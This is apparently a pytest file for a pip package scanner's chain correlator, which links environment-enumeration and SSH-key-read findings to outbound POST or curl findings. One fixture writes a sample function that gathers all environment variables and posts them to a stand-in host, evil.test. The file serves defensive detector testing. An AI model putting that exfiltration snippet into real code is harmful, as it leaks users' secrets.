"""Tests for chain_correlator."""

from pipguard.detectors.chain_correlator import correlate
from pipguard.models.finding import Finding


class TestChainCorrelator:
    def test_no_correlation_without_both(self):
        findings = [
            Finding(rule_id="ENV-ENUM", severity="medium", file="a.py", message="env enum"),
        ]
        result = correlate(findings)
        assert len(result) == 1
        assert all(f.rule_id != "SOURCE-TO-SINK" for f in result)

    def test_correlation_same_file(self):
        findings = [
            Finding(rule_id="ENV-ENUM", severity="medium", file="evil.py", message="env enum"),
            Finding(
                rule_id="EXFIL-SINK", severity="medium", file="evil.py", message="requests.post"
            ),
        ]
        result = correlate(findings)
        corr = [f for f in result if f.rule_id in {"SOURCE-TO-SINK", "SOURCE-TO-SINK-FUNCTION"}]
        assert len(corr) == 1
        assert corr[0].severity == "critical"
        assert corr[0].file == "evil.py"

    def test_no_correlation_different_files(self):
        findings = [
            Finding(rule_id="ENV-ENUM", severity="medium", file="a.py", message="env enum"),
            Finding(
                rule_id="EXFIL-SINK", severity="medium", file="b.py", message="requests.post"
            ),
        ]
        result = correlate(findings)
        corr = [f for f in result if f.rule_id in {"SOURCE-TO-SINK", "SOURCE-TO-SINK-FUNCTION"}]
        assert len(corr) == 0

    def test_secret_path_plus_subprocess(self):
        findings = [
            Finding(
                rule_id="SECRET-PATH-READ",
                severity="high",
                file="steal.py",
                message="reads ssh key",
            ),
            Finding(
                rule_id="SUSPICIOUS-SUBPROCESS",
                severity="high",
                file="steal.py",
                message="curl",
            ),
        ]
        result = correlate(findings)
        corr = [f for f in result if f.rule_id in {"SOURCE-TO-SINK", "SOURCE-TO-SINK-FUNCTION"}]
        assert len(corr) == 1
        assert corr[0].severity == "critical"

    def test_multiple_sources_and_sinks(self):
        findings = [
            Finding(rule_id="ENV-ENUM", severity="medium", file="x.py", message="env"),
            Finding(
                rule_id="SECRET-PATH-READ", severity="high", file="x.py", message="ssh"
            ),
            Finding(rule_id="EXFIL-SINK", severity="medium", file="x.py", message="post"),
            Finding(
                rule_id="SUSPICIOUS-SUBPROCESS",
                severity="high",
                file="x.py",
                message="curl",
            ),
        ]
        result = correlate(findings)
        corr = [f for f in result if f.rule_id in {"SOURCE-TO-SINK", "SOURCE-TO-SINK-FUNCTION"}]
        assert len(corr) == 1

    def test_function_level_correlation_message(self, tmp_path):
        code = (
            "def safe():\n"
            "    pass\n\n"
            "def steal():\n"
            "    import os, requests\n"
            "    data = dict(os.environ)\n"
            "    requests.post('http://evil.test', json=data)\n"
        )
        target = tmp_path / "sample.py"
        target.write_text(code)
        findings = [
            Finding(
                rule_id="ENV-ENUM",
                severity="medium",
                file=str(target),
                message="Environment enumeration pattern",
                evidence="line 6",
            ),
            Finding(
                rule_id="EXFIL-SINK",
                severity="medium",
                file=str(target),
                message="Outbound network call",
                evidence="line 7",
            ),
        ]
        result = correlate(findings)
        corr = [f for f in result if f.rule_id == "SOURCE-TO-SINK-FUNCTION"]
        assert len(corr) == 1
        assert "Function-level source-to-sink correlation" in corr[0].message
